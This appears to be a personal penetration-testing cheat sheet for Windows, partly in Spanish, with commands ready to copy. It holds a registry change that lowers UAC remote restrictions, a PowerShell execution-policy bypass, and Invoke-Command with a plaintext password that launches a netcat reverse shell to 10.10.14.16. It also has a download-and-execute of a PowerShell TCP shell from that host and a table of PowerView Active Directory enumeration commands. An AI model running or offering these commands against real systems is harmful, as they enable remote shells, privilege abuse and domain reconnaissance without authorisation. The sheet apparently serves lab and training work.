# Windows

## Crackmapexec `(Pwn3d!)`

`cmd.exe /c reg add HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f`

## Powershell

### Bypass de execution policy

```powershell
powerShell.exe -ExecutionPolicy Bypass .\script.ps1
```

Refs: https://www.netspi.com/blog/technical/network-penetration-testing/15-ways-to-bypass-the-powershell-execution-policy/

### Invoke command providing credentials

```powershell
$userName = 'WORKGROUP\Hector'
$userPassword = 'l33th4x0rhector'
$secStringPassword = ConvertTo-SecureString $userPassword -AsPlainText -Force
$credObject = New-Object System.Management.Automation.PSCredential ($userName, $secStringPassword)
# ComputerName obtenida de los comandos: 
hostname
$env:COMPUTERNAME
[Environment]::MachineName

# Con o sin ComputerName en el caso de que sea local
Invoke-Command -ComputerName Fidelity -Credential $credObject -ScriptBlock {C:\Windows\Temp\nc.exe -e cmd.exe 10.10.14.16 4321}

Start-Process -FilePath 'powershell' -argumentlist "IEX(New-Object Net.webClient).downloadString('http://10.10.14.16/Invoke-PowerShellTcp.ps1')" -Credential $credObject
```

## PowerView

| Name | Description | Suggested Execution |
|---|---|---|
| Get-Domain | Returns a domain object for the current domain or the domain specified with `-Domain`. Useful information includes the domain name, the forest name and the domain controllers. | `Get-Domain` |
| Get-DomainController | Returns the domain controllers for the current or specified domain. | `Get-DomainController \| select Forest, Name, OSVersion \| fl` |
| Get-ForestDomain | Returns all domains for the current forest or the forest specified by `-Forest`. | `Get-ForestDomain` |
| Get-DomainPolicyData | Returns the default domain policy or the domain controller policy for the current domain or a specified domain/domain controller. Useful for finding information such as the domain password policy. | `Get-DomainPolicyData \| select -expand SystemAccess` |
| Get-DomainUser | Return all (or specific) user(s). To only return specific properties, use `-Properties`. By default, all user objects for the current domain are returned, use `-Identity` to return a specific user. | `Get-DomainUser -Identity jking -Properties DisplayName, MemberOf \| fl` |
| Get-DomainComputer | Return all computers or specific computer objects. | `Get-DomainComputer -Properties DnsHostName \| sort -Property DnsHostName` |
| Get-DomainOU | Search for all organization units (OUs) or specific OU objects. | `Get-DomainOU -Properties Name \| sort -Property Name` |
| Get-DomainGroup | Return all domain groups or specific domain group objects. | `Get-DomainGroup \| where Name -like "*Admins*" \| select SamAccountName` |
| Get-DomainGroupMember | Return the members of a specific domain group. | `Get-DomainGroupMember -Identity "Domain Admins" \| select` |
| Get-DomainGPO | Return all Group Policy Objects (GPOs) or specific GPO objects. To enumerate all GPOs that are applied to a particular machine, use `-ComputerIdentity`. | `Get-DomainGPO -Properties DisplayName \| sort -Property DisplayName` |
| Get-DomainGPOLocalGroup | Returns all GPOs that modify local group membership through Restricted Groups or Group Policy Preferences. You can then manually find which OUs, and by extension which computers, these GPOs apply to. | `Get-DomainGPOLocalGroup \| select GPODisplayName, GroupName` |
| Get-DomainGPOUserLocalGroupMapping | Enumerates the machines where a specific domain user/group is a member of a specific local group. This is useful for finding where domain groups have local admin access, which is a more automated way to perform the manual cross-referencing described above. | `Get-DomainGPOUserLocalGroupMapping -LocalGroup Administrators \| select ObjectName, GPODisplayName, ContainerName, ComputerName \| fl` |
| Get-DomainTrust | Return all domain trusts for the current or specified domain. | `Get-DomainTrust` |